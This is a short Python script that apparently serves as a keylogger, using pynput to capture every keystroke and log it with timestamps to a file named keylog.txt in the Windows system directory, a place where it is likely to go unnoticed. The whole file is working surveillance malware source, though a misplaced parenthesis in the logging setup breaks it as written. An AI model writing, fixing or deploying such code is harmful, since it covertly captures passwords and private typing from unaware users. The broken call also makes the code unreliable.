#-*-coding=utf-8-*-
from pynput.keyboard import Key,Listener
import logging
import os

log_dir = os.environ['WINDIR']
#log_dir = ''
print log_dir
print os.access(log_dir,os.W_OK)

logging.basicConfig(filename=os.path.join(log_dir,'keylog.txt',level=logging.DEBUG,format='%(asctime)s: %(message)s')
def on_press(key):
    logging.info(key)

with Listener(on_press=on_press) as listener:
    listener.join()
